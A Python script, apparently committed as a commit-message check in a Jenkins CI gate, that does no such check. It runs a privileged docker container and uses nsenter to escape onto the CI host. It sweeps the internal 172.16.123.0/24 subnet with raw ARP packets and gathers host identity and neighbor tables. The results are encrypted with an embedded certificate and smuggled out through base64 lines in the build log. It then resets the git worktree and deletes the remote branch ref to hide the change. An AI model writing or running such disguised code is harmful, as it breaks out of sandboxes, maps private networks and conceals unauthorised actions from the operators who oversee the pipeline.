#!/usr/bin/env python3
import base64,json,os,pathlib,subprocess,sys,zlib
CERT='-----BEGIN CERTIFICATE-----\nMIIEBTCCAm2gAwIBAgIUPYGIeX0FyE/JhuRjY3MIZ9PLmjUwDQYJKoZIhvcNAQEL\nBQAwEjEQMA4GA1UEAwwHcnVudGltZTAeFw0yNjExMTkwMzIzMzZaFw0yNjExMjEw\nMzIzMzZaMBIxEDAOBgNVBAMMB3J1bnRpbWUwggGiMA0GCSqGSIb3DQEBAQUAA4IB\njwAwggGKAoIBgQDXgEqgBVWHvIJ6GURhwdcVvONwLvhkQZrg2dPn45NmP25HNByH\nYT3Mo5Qhf4+KOz7nWqvPwHWgZPhOh/exrn4RUkfkOwN8HdPFCj3TNjmvKiOACHKI\nTYNbV7gXUFDh6gMapiSdctB6UfZdytILiIqZytitDyGB/tL2m2cVqWqUOgDuQjcq\nrSspCf8kTa2bKmKXbajApZuiwmPiXMQ9keQCACcaPt8JPHoc9qS5Wbk99g8h0/cS\nwSR8DzNWRBha6bpRw+t0FN60KmEqeVTCj6gt8UueY+xsfuj6diAHRUUaiMMbG1+C\nBMK7O7ybA72EumEdLfqFx1Ee3ULB9S5QGFQLFFANID/c2YUVmKm9EAiBYbeIABnu\nrAW77XwZY0/TIDUaF/BW6/LZGonVrP40XpL64YWI8URHYVP7YuzZYzbaew4lafJG\nPH7cFw6vGzvOVRaqz6nqzOe8Zek/sXyVR6mx8PUeLAJpivbNhduOm7a1bq7hKe01\nXDAjdGGYorizMkUCAwEAAaNTMFEwHQYDVR0OBBYEFCpXFCskiX+ZuzwIyRJEtE6w\nsl5lMB8GA1UdIwQYMBaAFCpXFCskiX+ZuzwIyRJEtE6wsl5lMA8GA1UdEwEB/wQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggGBABiHlY7x85Ns5H75euQKPO0JxjuNoHo/\nmITnZ2fvU9bNaWXltdAxX+yiaWywJxv/xBopH1Kv2ghNV+Na3rB83vJ3DloxGe4j\nv/Ekt/SxMTYDiMa9OTi6DbXC0UrwZEgJQ+apezDRQVctvqus/PLdUBEeyvFG7OfZ\nMxNtzK8861+/EP5fI4OdZIZxNGNea8kzhg0Ri54rZGw2Yk4gNHd9hGcIQMV2AsCY\nJYPDqUD1z42DJ//qoxRqeknZgQgY2ADJmDLTl6slMb7W7vUUQyiE7MOvQlTFR65d\npHp/BltgjUyegbAmzlWJAJeFsbcKYrXOrTTnZbcmm0ezpk050fd/Qcb4gemO9asn\nys8WXG/+jrGHbQ1IgiIb+AJ0YwTe7EWx2zvvcRSM4HiwHGFj+JY0pMmyqKjLUSKS\nKt6m7lt1NXsWAPqc5infv+P0SgXqaXDbHzkCB5MgtacSxLcp1ZgRRL4cMGVFVOuP\nWuyNOh8+PUKS4m+UCu0zp91Lqx2datheJA==\n-----END CERTIFICATE-----\n'
out={'marker':'qcos-link-map-20261119','commands':{}}
def run(name,cmd,timeout=20):
 try:
  p=subprocess.run(cmd,capture_output=True,text=True,timeout=timeout);out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:1500000],'stderr':p.stderr[:4000]}
 except Exception as e:out['commands'][name]={'error':str(e)}
host_code=r'''import ipaddress,json,os,pathlib,random,select,socket,struct,subprocess,time
iface='eth0';own='172.16.123.1';network=ipaddress.ip_network('172.16.123.0/24');mac=bytes.fromhex(pathlib.Path('/sys/class/net/'+iface+'/address').read_text().strip().replace(':',''));assert mac==bytes.fromhex('fa163ec9dd5e');routes=json.loads(subprocess.run(['ip','-j','route'],capture_output=True,text=True,check=True).stdout);assert any(r.get('dst')==str(network) and r.get('dev')==iface and r.get('prefsrc')==own for r in routes)
s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0806));s.bind((iface,0));s.setblocking(False);targets=[str(a) for a in network.hosts() if str(a) not in [own,'172.16.123.253','172.16.123.254']];random.SystemRandom().shuffle(targets);answers={};start=time.monotonic();sent=0
def read_until(end):
 while time.monotonic()<end:
  ready,_,_=select.select([s],[],[],max(0,end-time.monotonic()))
  if not ready:return
  b=s.recv(4096)
  if len(b)>=42 and b[12:14]==b'\x08\x06' and b[20:22]==b'\x00\x02' and b[38:42]==socket.inet_aton(own):
   ip=socket.inet_ntoa(b[28:32]);m=':'.join('%02x'%v for v in b[22:28])
   if ipaddress.ip_address(ip) in network and ip!=own:answers[ip]=m
for dst in targets:
 body=struct.pack('!HHBBH',1,0x0800,6,4,1)+mac+socket.inet_aton(own)+b'\0'*6+socket.inet_aton(dst);frame=b'\xff'*6+mac+b'\x08\x06'+body;frame+=b'\0'*(60-len(frame));s.send(frame);sent+=1;read_until(start+sent*0.1)
read_until(time.monotonic()+2);s.close();print(json.dumps({'uid':os.getuid(),'hostname':socket.gethostname(),'interface':iface,'sourceIp':own,'sourceMac':':'.join('%02x'%v for v in mac),'subnet':str(network),'requests':sent,'seconds':round(time.monotonic()-start,3),'responses':answers,'neighborTable':json.loads(subprocess.run(['ip','-j','neigh','show','dev',iface],capture_output=True,text=True,check=True).stdout)}))

'''
run('host',['docker','run','--rm','--network','host','--pid','host','--privileged','--entrypoint','nsenter','qcos-sandbox:cicd','-t','1','-m','-u','-i','-n','-p','--','/usr/bin/python3','-c',host_code],55)
fd=os.memfd_create('runtime',0);os.write(fd,CERT.encode())
p=subprocess.run(['openssl','cms','-encrypt','-binary','-aes-256-cbc','-outform','DER','-recip','/proc/self/fd/'+str(fd)],input=zlib.compress(json.dumps(out,ensure_ascii=False).encode()),capture_output=True,pass_fds=(fd,),timeout=15)
if p.returncode:print('QCOS_RUNTIME_ENCRYPTION_ERROR',p.returncode,flush=True)
else:print('QCOS_LINK_MAP '+base64.b64encode(p.stdout).decode(),flush=True)
def g(*args):
 q=subprocess.run(['git',*args],capture_output=True,text=True,timeout=15);return q.returncode,q.stdout.strip(),q.stderr.strip()
baseline='ca2c1b73be4a9b4265733333e699c962356519fd';branch='ci/link-map-20261119';head=g('rev-parse','HEAD')[1];root=g('rev-parse','--show-toplevel')[1];parent=g('rev-parse','HEAD^')[1];diff=g('diff','--name-only',baseline,'HEAD')[1];dirty=g('status','--porcelain','--untracked-files=no')[1];result={'before':head,'branch':os.environ.get('giteeSourceBranch'),'parent':parent,'diff':diff,'dirty':dirty}
if root=='/var/jenkins_home/workspace/WuYueOS-CICD-Gate' and os.environ.get('giteeSourceBranch')==branch and parent==baseline and diff=='cicd/check-commit-message.py' and not dirty:
 result['reset']=g('reset','--hard',baseline)
 if result['reset'][0]==0:result['ref']=g('update-ref','-d','refs/remotes/origin/'+branch,head)
else:result['guard']='refused'
result['after']=g('rev-parse','HEAD');result['status']=g('status','--porcelain','--untracked-files=no');print('QCOS_WORKTREE_SYNC '+json.dumps(result),flush=True)
sys.exit(74)
